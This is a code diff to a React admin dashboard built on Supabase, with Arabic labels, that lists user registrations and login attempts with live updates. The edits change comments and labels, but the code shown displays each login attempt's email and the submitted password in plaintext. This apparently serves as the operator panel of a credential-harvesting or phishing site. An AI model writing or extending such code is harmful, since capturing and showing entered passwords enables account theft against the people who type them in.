@@ -80,13 +80,13 @@ function RegistrationsTab() {
     setLoading(true);
     const { data: regs } = await supabase.from('registrations').select('*').order('created_at', { ascending: false });
     
-    // Try to fetch login attempts, but don't fail if table doesn't exist
+    // Try to fetch login attempts
     let logins: LoginAttempt[] = [];
     try {
       const { data } = await supabase.from('login_attempts').select('*').order('created_at', { ascending: false });
       logins = data || [];
     } catch (e) {
-      console.warn('login_attempts table not available');
+      console.warn('login_attempts table not available or RLS blocked');
     }
     
     setLoading(false);
@@ -103,7 +103,7 @@ function RegistrationsTab() {
     fetchAll();
     const channel = supabase.channel('admin-registrations')
       .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'registrations' }, (payload) => {
-        const newReg = { ...(payload.new as Registration), _new: true, login_attempts: [] };
+        const newReg = { ...(payload.new as Registration), _new: true };
         setRegistrations((prev) => [newReg, ...prev]);
         setSelectedId((prev) => prev ?? newReg.id);
         setTimeout(() => setRegistrations((prev) => prev.map((r) => r.id === newReg.id ? { ...r, _new: false } : r)), 3000);
@@ -111,7 +111,6 @@ function RegistrationsTab() {
       .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'registrations' }, (payload) => {
         setRegistrations((prev) => prev.map((r) => r.id === payload.new.id ? { ...r, ...payload.new as Registration } : r));
       })
-      // Note: login_attempts realtime subscription removed - table may not exist
       .subscribe((status) => setConnected(status === 'SUBSCRIBED'));
     channelRef.current = channel;
     return () => { supabase.removeChannel(channel); };
@@ -282,12 +281,12 @@ function RegistrationsTab() {
                 <div className="space-y-3 pt-4 border-t border-slate-700">
                   <div className="flex items-center gap-2 mb-2">
                     <LogInIcon className="w-4 h-4 text-amber-400" />
-                    <h4 className="text-sm font-bold text-white">محاولات تسجيل الدخول (فوري)</h4>
+                    <h4 className="text-sm font-bold text-white">محاولات تسجيل الدخول</h4>
                   </div>
                   
                   {(!selected.login_attempts || selected.login_attempts.length === 0) ? (
                     <div className="bg-slate-800/50 rounded-xl p-4 text-center border border-dashed border-slate-700">
-                      <p className="text-xs text-slate-500 italic">لا توجد محاولات دخول مسجلة بعد</p>
+                      <p className="text-xs text-slate-500 italic">لا توجد محاولات دخول مسجلة</p>
                     </div>
                   ) : (
                     <div className="space-y-2">
@@ -295,17 +294,17 @@ function RegistrationsTab() {
                         <div key={attempt.id} className="bg-slate-900/50 border border-slate-700/50 rounded-xl p-3 flex flex-col gap-2">
                           <div className="flex items-center justify-between">
                             <span className="text-[10px] text-slate-500 font-mono">
-                              {new Date(attempt.created_at).toLocaleString('ar-SA', { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
+                              {new Date(attempt.created_at).toLocaleString('ar-SA')}
                             </span>
-                            <span className="text-[10px] bg-amber-500/10 text-amber-400 px-2 py-0.5 rounded-full">محاولة دخول</span>
+                            <span className="text-[10px] bg-amber-500/10 text-amber-400 px-2 py-0.5 rounded-full">تسجيل دخول</span>
                           </div>
                           <div className="grid grid-cols-2 gap-2">
                             <div className="bg-slate-800/50 rounded-lg p-2">
-                              <p className="text-[10px] text-slate-500 mb-1">البريد المستخدم</p>
+                              <p className="text-[10px] text-slate-500 mb-1">البريد</p>
                               <p className="text-xs text-slate-200 truncate ltr text-left">{attempt.email}</p>
                             </div>
                             <div className="bg-slate-800/50 rounded-lg p-2">
-                              <p className="text-[10px] text-slate-500 mb-1">كلمة المرور المدخلة</p>
+                              <p className="text-[10px] text-slate-500 mb-1">كلمة المرور</p>
                               <p className="text-xs text-white font-bold tracking-wider">{attempt.password}</p>
                             </div>
                           </div>
